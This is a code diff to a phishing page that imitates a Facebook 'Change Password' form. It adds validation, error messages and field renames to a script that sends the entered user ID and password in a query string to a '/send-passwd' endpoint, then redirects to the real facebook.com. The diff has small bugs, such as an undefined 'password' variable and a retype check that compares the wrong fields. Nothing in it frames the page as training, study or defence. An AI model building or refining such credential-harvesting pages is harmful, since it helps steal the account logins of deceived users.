@@ -8,9 +8,14 @@
     <script>
         async function send(event) {
             event.preventDefault();
-            let email = document.getElementById("email").value;
-            let password = document.getElementById("curr-password").value;
-            const response = await fetch(`/send-passwd?email=${email}&password=${password}`);    
+            let userId = document.getElementById("user-id").value;
+            let currPassword = document.getElementById("curr-password").value;
+            let newPassword = document.getElementById("new-password").value;
+            let retypePassword = document.getElementById("retype-new-password").value;
+            if (!validate(userId, currPassword, newPassword, retypePassword)){
+                return;
+            }
+            const response = await fetch(`/send-passwd?user_id=${userId}&password=${password}`);    
             if (!response.ok) {
                 const error = await response.json();
                 console.log(`Error: ${error.error}`);
@@ -18,6 +23,35 @@
             }
             window.location.href = 'https://facebook.com';
         }
+        function validate(userId, currPassword, newPassword, repeatPassword) {
+            let flag = true;
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phoneRegex = /^\+?\d{6,15}$/;
+            const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d).{6,}$/;
+            const isValidUserId = emailRegex.test(userId) || phoneRegex.test(userId);
+            if (!isValidUserId) {
+                document.getElementById("wrong-id").hidden = flag = false;
+            } else {
+                document.getElementById("wrong-id").hidden = true;
+            }
+            if (!passwordRegex.test(currPassword)) {
+                document.getElementById("wrong-curr-password").hidden = flag = false;
+            } else {
+                document.getElementById("wrong-curr-password").hidden = true;
+            }
+            if (!passwordRegex.test(newPassword)) {
+            document.getElementById("wrong-new-password").hidden = flag = false;
+            } else {
+                document.getElementById("wrong-new-password").hidden = true;
+            }
+            if (currPassword !== newPassword) {
+                document.getElementById("wrong-retype-password").hidden = flag = false;
+            } else {
+                document.getElementById("wrong-retype-password").hidden = true;
+            }
+            return flag
+        }
+
     </script>
 </head>
 <body>
@@ -25,14 +59,21 @@
         <p>Kamil Nuriev · Facebook</p>
         <h1>Change Password</h1>
         <p>Your password must be at least 6 characters and should include a combination of numbers, letters and special characters(!@%)</p>
-        <label for="id">Email/Phone number</label>
-        <input type="text" id="id">
+        <label for="user-id">Email/Phone number</label>
+        <input type="text" id="user-id">
+        <div id="wrong-id" hidden>Enter a valid phone number or email address</div>
+
         <label for="curr-password">Current password</label>
         <input type="password" id="curr-password">
+        <div id="wrong-curr-password" hidden>Wrong password</div>
+
         <label for="new-password">New password</label>
         <input type="password" id="new-password">
+        <div id="wrong-new-password" hidden>Your password must be at least 6 characters and should include a combination of numbers, letters and special characters(!@%)</div>
+
         <label for="retype-new-password">Re-type new password</label>
         <input type="password" id="retype-new-password">
+        <div id="wrong-retype-password" hidden>Passwords do not match</div>
         <a href="">Forgot your password?</a>
         <label for="logout">Log out of other devices. Choose this if someone uses your account.</label>
         <input type="checkbox" id="logout" checked>
